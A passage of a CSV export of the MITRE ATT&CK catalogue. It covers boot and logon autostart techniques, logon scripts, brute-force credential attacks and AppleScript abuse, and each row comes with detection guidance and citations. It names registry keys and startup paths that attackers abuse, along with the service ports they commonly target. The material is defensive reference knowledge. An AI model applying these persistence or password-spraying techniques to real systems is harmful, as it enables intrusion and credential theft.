Lazarus Resurfaces Feb 2018),(Citation: ESET Gazer Aug 2017),(Citation: FireEye APT10 April 2017),(Citation: Nccgroup Emissary Panda May 2018),(Citation: ESET RTM Feb 2017),(Citation: Kaspersky Sofacy),(Citation: Unit42 Xbash Sept 2018),(Citation: FireEye Operation Double Tap),(Citation: Prevx Carberp March 2011),(Citation: Microsoft Holmium June 2020),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Proofpoint NETWIRE December 2020),(Citation: Talos Konni May 2017),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: DFIR Phosphorus November 2021),(Citation: ESET InvisiMole June 2020),(Citation: Gigamon Berserk Bear October 2021),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Unit 42 NOKKI Sept 2018),(Citation: ClearSky Wilted Tulip July 2017),(Citation: GitHub Pupy),(Citation: Malwarebytes DarkComet March 2018),(Citation: IBM TA505 April 2020),(Citation: Symantec Dragonfly),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: NCC Group Team9 June 2020),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),"
T1547.005,attack-pattern--5095a853-299c-4876-abd7-ac0050fb5462,Boot or Logon Autostart Execution: Security Support Provider,"Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.

The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)",https://attack.mitre.org/techniques/T1547/005,24 January 2020,25 March 2020,enterprise-attack,1.0,"Persistence, Privilege Escalation",Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe</code> with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA),Windows,"Command: Command Execution, Module: Module Load, Windows Registry: Windows Registry Key Modification",True,T1547,,,Administrator,,,,,"(Citation: Deply Mimikatz),(Citation: Github PowerShell Empire),(Citation: GitHub PowerSploit May 2012),(Citation: PowerSploit Documentation),(Citation: Microsoft Configure LSA),(Citation: Graeber 2014)"
T1547.009,attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179,Boot or Logon Autostart Execution: Shortcut Modification,"Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.

Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.

Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176)) to persistently launch malware.",https://attack.mitre.org/techniques/T1547/009,24 January 2020,30 March 2023,enterprise-attack,1.2,"Persistence, Privilege Escalation","Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.

Monitor for LNK files created with a Zone Identifier value greater than 1, which may indicate that the LNK file originated from outside of the network.(Citation: BSidesSLC 2020 - LNK Elastic)",Windows,"File: File Creation, File: File Modification, Process: Process Creation",True,T1547,,"Bobby, Filar, Elastic; David French, Elastic; Travis Smith, Tripwire","Administrator, User",,,,,"(Citation: Cofense Astaroth Sept 2018),(Citation: FireEye Periscope March 2018),(Citation: Unit 42 Kazuar May 2017),(Citation: ESET GreyEnergy Oct 2018),(Citation: FireEye APT39 Jan 2019),(Citation: Cybereason Astaroth Feb 2019),(Citation: ESET Okrum July 2019),(Citation: Cylance Cleaver),(Citation: F-Secure BlackEnergy 2014),(Citation: Palo Alto Comnie),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: ESET Gazer Aug 2017),(Citation: IBM Grandoreiro April 2020),(Citation: Palo Alto OilRig May 2016),(Citation: Palo Alto Reaver Nov 2017),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Accenture Hogfish April 2018),(Citation: Cybereason Bazar July 2020),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Talos Micropsia June 2017),(Citation: Unit 42 SeaDuke 2015),(Citation: Cylance Dust Storm),(Citation: Github PowerShell Empire),(Citation: FireEye APT30),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Talos Konni May 2017),(Citation: Baumgartner Naikon 2015),(Citation: ESET InvisiMole June 2020),(Citation: Securelist WhiteBear Aug 2017),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: NCC Group Team9 June 2020),(Citation: UCF STIG Symbolic Links)"
T1547.003,attack-pattern--61afc315-860c-4364-825d-0d62b2e91edc,Boot or Logon Autostart Execution: Time Providers,"Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)

Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\</code>.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)

Adversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)",https://attack.mitre.org/techniques/T1547/003,24 January 2020,20 April 2022,enterprise-attack,1.0,"Persistence, Privilege Escalation","Baseline values and monitor/analyze activity related to modifying W32Time information in the Registry, including application programming interface (API) calls such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code> as well as execution of the W32tm.exe utility.(Citation: Microsoft W32Time May 2017) There is no restriction on the number of custom time providers registrations, though each may require a DLL payload written to disk.(Citation: Github W32Time Oct 2017)

The Sysinternals Autoruns tool may also be used to analyze auto-starting locations, including DLLs listed as time providers.(Citation: TechNet Autoruns)",Windows,"Command: Command Execution, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1547,,"Scott Lundgren, @5twenty9, Carbon Black","Administrator, SYSTEM",,,,,",(Citation: Microsoft W32Time May 2017)"
T1547.004,attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35,Boot or Logon Autostart Execution: Winlogon Helper DLL,"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\Software[\\Wow6432Node\\]\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> and <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) 

Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)

* Winlogon\Notify - points to notification package DLLs that handle Winlogon events
* Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on
* Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on

Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",https://attack.mitre.org/techniques/T1547/004,24 January 2020,14 August 2023,enterprise-attack,1.1,"Persistence, Privilege Escalation","Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. (Citation: TechNet Autoruns)  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.

Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",Windows,"Command: Command Execution, Module: Module Load, Windows Registry: Windows Registry Key Modification",True,T1547,,Praetorian,"Administrator, SYSTEM",,,,,"(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: ESET Gazer Aug 2017),(Citation: Cylance Shaheen Nov 2018),(Citation: ESET Turla Mosquito Jan 2018),(Citation: PWC KeyBoys Feb 2017),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Microsoft PLATINUM April 2016),(Citation: Unit42 Cannon Nov 2018),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Zscaler Bazar September 2020),(Citation: Securelist Remexi Jan 2019),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: CitizenLab KeyBoy Nov 2016),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: NSA MS AppLocker)"
T1547.013,attack-pattern--e0232cb0-ded5-4c2e-9dc7-2893142a5c11,Boot or Logon Autostart Execution: XDG Autostart Entries,"Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user’s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (`.desktop`) to configure the user’s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.(Citation: Free Desktop Application Autostart Feb 2006)(Citation: Free Desktop Entry Keys)

Adversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the `Exec` directive in the `.desktop` configuration file. When the user’s desktop environment is loaded at user login, the `.desktop` files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the `/etc/xdg/autostart` directory while the user entries are located in the `~/.config/autostart` directory.

Adversaries may combine this technique with [Masquerading](https://attack.mitre.org/techniques/T1036) to blend malicious Autostart entries with legitimate programs.(Citation: Red Canary Netwire Linux 2022)",https://attack.mitre.org/techniques/T1547/013,10 September 2019,16 October 2023,enterprise-attack,1.1,"Persistence, Privilege Escalation","Malicious XDG autostart entries may be detected by auditing file creation and modification events within the <code>/etc/xdg/autostart</code> and <code>~/.config/autostart</code> directories. Depending on individual configurations, defenders may need to query the environment variables <code>$XDG_CONFIG_HOME</code> or <code>$XDG_CONFIG_DIRS</code> to determine the paths of Autostart entries. Autostart entry files not associated with legitimate packages may be considered suspicious. Suspicious entries can also be identified by comparing entries to a trusted system baseline.
 
Suspicious processes or scripts spawned in this manner will have a parent process of the desktop component implementing the XDG specification and will execute as the logged on user.",Linux,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1547,,"Tony Lambert, Red Canary","root, User",,,,,"(Citation: Red Canary Netwire Linux 2022),(Citation: Red Canary NETWIRE January 2020),(Citation: RotaJakiro 2021 netlab360 analysis),(Citation: Fysbis Dr Web Analysis),"
T1037.002,attack-pattern--43ba2b05-cf72-4b6c-8243-03a4aba41ee0,Boot or Logon Initialization Scripts: Login Hook,"Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the <code>/Library/Preferences/com.apple.loginwindow.plist</code> file and can be modified using the <code>defaults</code> command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.(Citation: Login Scripts Apple Dev)(Citation: LoginWindowScripts Apple Dev) 

Adversaries can add or insert a path to a malicious script in the <code>com.apple.loginwindow.plist</code> file, using the <code>LoginHook</code> or <code>LogoutHook</code> key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.(Citation: S1 macOs Persistence)(Citation: Wardle Persistence Chapter)

**Note:** Login hooks were deprecated in 10.11 version of macOS in favor of [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) ",https://attack.mitre.org/techniques/T1037/002,10 January 2020,20 April 2022,enterprise-attack,2.0,"Persistence, Privilege Escalation",Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.,macOS,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1037,,,,,,,,","
T1037.001,attack-pattern--eb125d40-0b2d-41ac-a71a-3229241c2cd3,Boot or Logon Initialization Scripts: Logon Script (Windows),"Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\Environment\UserInitMprLogonScript</code> Registry key.(Citation: Hexacorn Logon Scripts)

Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. ",https://attack.mitre.org/techniques/T1037/001,10 January 2020,24 March 2020,enterprise-attack,1.0,"Persistence, Privilege Escalation","Monitor for changes to Registry values associated with Windows logon scrips, nameley <code>HKCU\Environment\UserInitMprLogonScript</code>.

Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.",Windows,"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation",True,T1037,,,,,,,,"(Citation: Talos Seduploader Oct 2017),(Citation: Unit 42 Playbook Dec 2017),(Citation: ESET Sednit Part 1),(Citation: Cybereason Kimsuky November 2020),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: ESET Attor Oct 2019),(Citation: ESET Zebrocy Nov 2018),"
T1037.003,attack-pattern--c63a348e-ffc2-486a-b9d9-d7f11ec54d99,Boot or Logon Initialization Scripts: Network Logon Script,"Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.(Citation: Petri Logon Script AD) These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  
 
Adversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",https://attack.mitre.org/techniques/T1037/003,10 January 2020,24 March 2020,enterprise-attack,1.0,"Persistence, Privilege Escalation",Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.,Windows,"Active Directory: Active Directory Object Modification, Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1037,,,,,,,,","
T1037.004,attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211,Boot or Logon Initialization Scripts: RC Scripts,"Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.

Adversaries can establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.

Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.(Citation: intezer-kaiji-malware)

Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004). (Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)",https://attack.mitre.org/techniques/T1037/004,15 January 2020,27 April 2021,enterprise-attack,2.0,"Persistence, Privilege Escalation","Monitor for unexpected changes to RC scripts in the <code>/etc/</code> directory. Monitor process execution resulting from RC scripts for unusual or unknown applications or behavior.

Monitor for <code>/etc/rc.local</code> file creation. Although types of RC scripts vary for each Unix-like distribution, several execute <code>/etc/rc.local</code> if present. ","Linux, macOS","Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1037,,,root,,,,,"(Citation: NCSC Cyclops Blink February 2022),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Intezer HiddenWasp Map 2019),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Mandiant APT29 Eye Spy Email Nov 22),(Citation: objsee mac malware 2017),"
T1037.005,attack-pattern--c0dfe7b0-b873-4618-9ff8-53e31f70907f,Boot or Logon Initialization Scripts: Startup Items,"Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.(Citation: Startup Items)

This is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. 

An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.(Citation: Methods of Mac Malware Persistence) Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.",https://attack.mitre.org/techniques/T1037/005,15 January 2020,20 April 2022,enterprise-attack,1.0,"Persistence, Privilege Escalation","The <code>/Library/StartupItems</code> folder can be monitored for changes. Similarly, the programs that are actually executed from this mechanism should be checked against a whitelist.

Monitor processes that are executed during the bootup process to check for unusual or unknown applications and behavior.",macOS,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1037,,,Administrator,,,,,"(Citation: Kaspersky Adwind Feb 2016),"
T1110.004,attack-pattern--b2d03cea-aec1-45ca-9744-9ee583c1e1cc,Brute Force: Credential Stuffing,"Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.

Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.

Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)

In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)",https://attack.mitre.org/techniques/T1110/004,11 February 2020,16 October 2023,enterprise-attack,1.4,Credential Access,"Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.","Azure AD, Containers, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, User Account: User Account Authentication",True,T1110,,Anastasios Pingios; Diogo Fernandes,,,,,,"(Citation: Bitdefender Trickbot March 2020),(Citation: ESET Trickbot Oct 2020),(Citation: NCC Group Chimera January 2021),(Citation: NIST 800-63-3),(Citation: Microsoft Common Conditional Access Policies)"
T1110.002,attack-pattern--1d24cdee-9ea2-4189-b08e-af110bf2435d,Brute Force: Password Cracking,"Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602) in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A) 

Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.",https://attack.mitre.org/techniques/T1110/002,11 February 2020,30 March 2023,enterprise-attack,1.2,Credential Access,"It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network. Consider focusing efforts on detecting other adversary behavior used to acquire credential materials, such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).","Azure AD, Linux, Network, Office 365, Windows, macOS","Application Log: Application Log Content, User Account: User Account Authentication",True,T1110,,Mohamed Kmal,,,,,,"(Citation: Cylance Cleaver),(Citation: FireEye FIN6 April 2016),(Citation: APT3 Adversary Emulation Plan),(Citation: Kali Hydra),(Citation: FireEye APT41 Aug 2019),(Citation: McAfee Night Dragon),(Citation: US-CERT TA18-074A),(Citation: NIST 800-63-3)"
T1110.001,attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119,Brute Force: Password Guessing,"Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.

Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)

Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)
* SNMP (161/UDP and 162/TCP/UDP)

In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)

In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625.",https://attack.mitre.org/techniques/T1110/001,11 February 2020,16 October 2023,enterprise-attack,1.5,Credential Access,"Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.","Azure AD, Containers, Google Workspace, IaaS, Linux, Network, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, User Account: User Account Authentication",True,T1110,,Microsoft Threat Intelligence Center (MSTIC); Mohamed Kmal,,,,,,"(Citation: Binary Defense Emotes Wi-Fi Spreader),(Citation: Microsoft STRONTIUM New Patterns Cred Harvesting Sept 2020),(Citation: FireEye Periscope March 2018),(Citation: CME Github September 2018),(Citation: Symantec Emotet Jul 2018),(Citation: CIS Emotet Dec 2018),(Citation: Trend Micro Xbash Sept 2018),(Citation: ANSSI Sandworm January 2021),(Citation: ESET Hermetic Wizard March 2022),(Citation: Unit 42 Lucifer June 2020),(Citation: Malwarebytes Pony April 2016),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Malwarebytes Emotet Dec 2017),(Citation: Secureworks Emotet Nov 2018),(Citation: US-CERT Emotet Jul 2018),(Citation: Unit42 Xbash Sept 2018),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: NIST 800-63-3),(Citation: Microsoft Common Conditional Access Policies)"
T1110.003,attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c,Brute Force: Password Spraying,"Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)

Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)

In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)

In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625.",https://attack.mitre.org/techniques/T1110/003,11 February 2020,16 October 2023,enterprise-attack,1.4,Credential Access,"Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). Specifically, monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.

Consider the following event IDs:(Citation: Trimarc Detecting Password Spraying)

* Domain Controllers: ""Audit Logon"" (Success & Failure) for event ID 4625.
* Domain Controllers: ""Audit Kerberos Authentication Service"" (Success & Failure) for event ID 4771.
* All systems: ""Audit Logon"" (Success & Failure) for event ID 4648.","Azure AD, Containers, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, User Account: User Account Authentication",True,T1110,,John Strand; Microsoft Threat Intelligence Center (MSTIC),,,,,,"(Citation: Microsoft Holmium June 2020),(Citation: Microsoft STRONTIUM New Patterns Cred Harvesting Sept 2020),(Citation: SecureWorks August 2019),(Citation: CME Github September 2018),(Citation: Microsoft Targeting Elections September 2020),(Citation: NCC Group Chimera January 2021),(Citation: Symantec Leafminer July 2018),(Citation: Anomali Linux Rabbit 2018),(Citation: Secure List Bad Rabbit),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Novetta Blockbuster),(Citation: GitHub MailSniper),(Citation: FireEye APT33 Guardrail),(Citation: MSRC Nobelium June 2021),(Citation: Novetta Blockbuster RATs),(Citation: DOJ Iran Indictments March 2018),(Citation: MSTIC Nobelium Oct 2021),(Citation: NIST 800-63-3),(Citation: Microsoft Common Conditional Access Policies)"
T1059.002,attack-pattern--37b11151-1776-4f8f-b328-30939fbf2ceb,Command and Scripting Interpreter: AppleScript,"Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.

Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e ""script here""</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.(Citation: SentinelOne AppleScript)

AppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s <code>NSAppleScript</code> or <code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.

Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro Malware Targets Macs)",https://attack.mitre.org/techniques/T1059/002,09 March 2020,19 October 2022,enterprise-attack,1.1,Execution,"Monitor for execution of AppleScript through <code>osascript</code> and usage of the <code>NSAppleScript</code> and <code>OSAScript</code> APIs that may be related to other suspicious behavior occurring on the system. Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.

